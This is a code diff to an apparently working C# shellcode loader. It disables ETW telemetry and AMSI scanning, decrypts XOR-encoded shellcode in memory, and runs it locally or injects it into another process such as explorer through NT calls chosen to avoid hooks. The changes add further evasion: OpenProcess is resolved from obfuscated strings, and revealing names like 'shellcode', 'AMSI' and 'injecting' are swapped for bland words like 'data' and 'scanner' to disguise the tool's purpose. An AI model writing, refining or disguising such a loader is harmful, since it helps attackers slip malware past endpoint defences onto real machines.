@@ -59,7 +59,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace CombinedEvasion
+namespace StealthRunner
 {
     class Program
     {
@@ -83,10 +83,18 @@ namespace CombinedEvasion
         static extern IntPtr LoadLibrary(string lpFileName);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool CloseHandle(IntPtr hObject);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate IntPtr ProcessOpenDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        static IntPtr ResolveAndCall(uint access, bool inherit, int pid)
+        {
+            IntPtr k32 = GetModuleHandle(FromOffsets(32, 75,69,82,78,69,76,19,18,14,68,76,76));
+            IntPtr addr = GetProcAddress(k32, FromOffsets(32, 47,80,69,78,48,82,79,67,69,83,83));
+            var fn = (ProcessOpenDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(ProcessOpenDelegate));
+            return fn(access, inherit, pid);
+        }
 
         // ====================================================================
         // SECTION 2: NT function delegates for dynamic resolution
@@ -152,7 +160,7 @@ namespace CombinedEvasion
         }
 
         // XOR decrypt shellcode.
-        static byte[] XorDecrypt(byte[] data, byte[] key)
+        static byte[] TransformData(byte[] data, byte[] key)
         {
             byte[] result = new byte[data.Length];
             for (int i = 0; i < data.Length; i++)
@@ -182,7 +190,7 @@ namespace CombinedEvasion
         // our process is doing through ETW events.
         static bool PatchTelemetry()
         {
-            Console.WriteLine("[1/6] Patching ETW...");
+            Console.WriteLine("[1/6] Patching telemetry...");
 
             // ntdll
             IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
@@ -209,7 +217,7 @@ namespace CombinedEvasion
             uint ignored;
             VirtualProtect(funcAddr, (UIntPtr)3, oldProtect, out ignored);
 
-            Console.WriteLine("      ETW patched. No telemetry from this process.");
+            Console.WriteLine("      Telemetry patched. No events from this process.");
             return true;
         }
 
@@ -222,7 +230,7 @@ namespace CombinedEvasion
         // not know we tampered with AMSI.
         static bool PatchScanner()
         {
-            Console.WriteLine("[2/6] Patching AMSI...");
+            Console.WriteLine("[2/6] Patching scanner...");
 
             // amsi.dll
             string dllName = FromOffsets(32, 65,77,83,73,14,68,76,76);
@@ -253,7 +261,7 @@ namespace CombinedEvasion
             uint ignored;
             VirtualProtect(funcAddr, (UIntPtr)6, oldProtect, out ignored);
 
-            Console.WriteLine("      AMSI patched. Script scanning disabled.");
+            Console.WriteLine("      Scanner patched. Content inspection disabled.");
             return true;
         }
 
@@ -261,7 +269,7 @@ namespace CombinedEvasion
         // SECTION 7: Local execution (run shellcode in current process)
         // ====================================================================
 
-        static void ExecuteLocal(byte[] shellcode)
+        static void ExecuteLocal(byte[] data)
         {
             IntPtr currentProcess = (IntPtr)(-1);
 
@@ -284,7 +292,7 @@ namespace CombinedEvasion
             // Allocate memory as READ-WRITE (not executable yet).
             Console.WriteLine("[5/6] Allocating memory...");
             IntPtr baseAddr = IntPtr.Zero;
-            IntPtr regionSize = (IntPtr)shellcode.Length;
+            IntPtr regionSize = (IntPtr)data.Length;
             int status = ntAlloc(currentProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (status != 0)
             {
@@ -292,11 +300,11 @@ namespace CombinedEvasion
                 return;
             }
 
-            // Write shellcode using Marshal.Copy.
-            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);
+            // Write data using Marshal.Copy.
+            Marshal.Copy(data, 0, baseAddr, data.Length);
 
             // Clear managed copy.
-            Array.Clear(shellcode, 0, shellcode.Length);
+            Array.Clear(data, 0, data.Length);
 
             // Change protection to EXECUTE-READ.
             IntPtr protAddr = baseAddr;
@@ -306,7 +314,7 @@ namespace CombinedEvasion
             Console.WriteLine("      Memory ready (RW -> RX).");
 
             // Create thread to execute.
-            Console.WriteLine("[6/6] Executing shellcode...");
+            Console.WriteLine("[6/6] Executing code...");
             IntPtr threadHandle;
             status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, currentProcess, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
             if (status != 0)
@@ -315,7 +323,7 @@ namespace CombinedEvasion
                 return;
             }
 
-            Console.WriteLine("      Shellcode running.");
+            Console.WriteLine("      Code running.");
             ntWait(threadHandle, false, IntPtr.Zero);
         }
 
@@ -323,7 +331,7 @@ namespace CombinedEvasion
         // SECTION 8: Remote injection (inject into another process)
         // ====================================================================
 
-        static void ExecuteRemote(byte[] shellcode, string targetProcessName)
+        static void ExecuteRemote(byte[] data, string targetProcessName)
         {
             // Find target process.
             Console.WriteLine("[4/6] Finding target process: " + targetProcessName + "...");
@@ -338,7 +346,7 @@ namespace CombinedEvasion
             Console.WriteLine("      Found PID: " + targetPid);
 
             // Open target process.
-            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+            IntPtr processHandle = ResolveAndCall(PROCESS_ALL_ACCESS, false, targetPid);
             if (processHandle == IntPtr.Zero)
             {
                 Console.WriteLine("      [-] Could not open process. Need admin privileges.");
@@ -360,9 +368,9 @@ namespace CombinedEvasion
                 FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
 
             // Allocate memory in target process.
-            Console.WriteLine("[5/6] Injecting into " + targetProcessName + "...");
+            Console.WriteLine("[5/6] Writing to " + targetProcessName + "...");
             IntPtr baseAddr = IntPtr.Zero;
-            IntPtr regionSize = (IntPtr)shellcode.Length;
+            IntPtr regionSize = (IntPtr)data.Length;
             int status = ntAlloc(processHandle, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (status != 0)
             {
@@ -371,13 +379,13 @@ namespace CombinedEvasion
                 return;
             }
 
-            // Write shellcode to target process using NtWriteVirtualMemory.
-            // Using the NT function instead of WriteProcessMemory avoids hooks.
+            // Write data to target process using NT write function.
+            // Using the NT function instead of the standard API avoids hooks.
             uint bytesWritten;
-            status = ntWrite(processHandle, baseAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
+            status = ntWrite(processHandle, baseAddr, data, (uint)data.Length, out bytesWritten);
 
             // Clear managed copy.
-            Array.Clear(shellcode, 0, shellcode.Length);
+            Array.Clear(data, 0, data.Length);
 
             if (status != 0)
             {
@@ -403,7 +411,7 @@ namespace CombinedEvasion
                 return;
             }
 
-            Console.WriteLine("      Shellcode running inside " + targetProcessName + " (PID " + targetPid + ").");
+            Console.WriteLine("      Code running inside " + targetProcessName + " (PID " + targetPid + ").");
             CloseHandle(threadHandle);
             CloseHandle(processHandle);
         }
@@ -416,62 +424,62 @@ namespace CombinedEvasion
         {
             if (args.Length < 2)
             {
-                Console.WriteLine("Combined Evasion Loader");
-                Console.WriteLine("Usage: stealth_loader.exe <encrypted_shellcode.bin> <xor_key_hex> [target_process]");
+                Console.WriteLine("Stealth Runner");
+                Console.WriteLine("Usage: runner.exe <data.bin> <key_hex> [target]");
                 Console.WriteLine("");
-                Console.WriteLine("  encrypted_shellcode.bin: XOR-encrypted shellcode file");
-                Console.WriteLine("  xor_key_hex:             XOR key from the encoder");
-                Console.WriteLine("  target_process:          optional process name for remote injection");
+                Console.WriteLine("  data.bin:   encrypted data file");
+                Console.WriteLine("  key_hex:    decryption key");
+                Console.WriteLine("  target:     optional target process name");
                 Console.WriteLine("");
                 Console.WriteLine("Examples:");
-                Console.WriteLine("  stealth_loader.exe payload.bin 4A7F2B1C...");
-                Console.WriteLine("  stealth_loader.exe payload.bin 4A7F2B1C... explorer");
+                Console.WriteLine("  runner.exe data.bin 4A7F2B1C...");
+                Console.WriteLine("  runner.exe data.bin 4A7F2B1C... explorer");
                 return;
             }
 
-            string shellcodePath = args[0];
+            string dataPath = args[0];
             string keyHex = args[1];
             string targetProcess = args.Length >= 3 ? args[2] : null;
 
-            Console.WriteLine("=== Combined Evasion Loader ===");
+            Console.WriteLine("=== Stealth Runner ===");
             Console.WriteLine("");
 
             // ---- Step 1: Patch ETW ----
             // Must be first. Stops all telemetry so subsequent patches are invisible.
             if (!PatchTelemetry())
             {
-                Console.WriteLine("[-] ETW patch failed. Continuing anyway (higher detection risk).");
+                Console.WriteLine("[-] Telemetry patch failed. Continuing anyway (higher detection risk).");
             }
 
             // ---- Step 2: Patch AMSI ----
             // Second step. With ETW patched, this tampering is not logged.
             if (!PatchScanner())
             {
-                Console.WriteLine("[-] AMSI patch failed. Continuing anyway (PowerShell scripts may be blocked).");
+                Console.WriteLine("[-] Scanner patch failed. Continuing anyway (scripts may be blocked).");
             }
 
-            // ---- Step 3: Decrypt shellcode ----
-            // The shellcode on disk is XOR-encrypted so it does not match
+            // ---- Step 3: Decrypt data ----
+            // The data on disk is encrypted so it does not match
             // any known signatures. We decrypt it in memory only.
-            Console.WriteLine("[3/6] Decrypting shellcode...");
-            byte[] encrypted = File.ReadAllBytes(shellcodePath);
+            Console.WriteLine("[3/6] Decrypting data...");
+            byte[] encrypted = File.ReadAllBytes(dataPath);
             byte[] key = HexToBytes(keyHex);
-            byte[] shellcode = XorDecrypt(encrypted, key);
+            byte[] data = TransformData(encrypted, key);
 
             // Clear the encrypted copy from managed memory.
             Array.Clear(encrypted, 0, encrypted.Length);
-            Console.WriteLine("      Decrypted " + shellcode.Length + " bytes in memory.");
+            Console.WriteLine("      Decrypted " + data.Length + " bytes in memory.");
 
             // ---- Steps 4-6: Execute ----
             if (targetProcess != null)
             {
-                // Remote injection into another process.
-                ExecuteRemote(shellcode, targetProcess);
+                // Remote mode: write into another process.
+                ExecuteRemote(data, targetProcess);
             }
             else
             {
-                // Local execution in current process.
-                ExecuteLocal(shellcode);
+                // Local mode: execute in current process.
+                ExecuteLocal(data);
             }
 
             Console.WriteLine("");
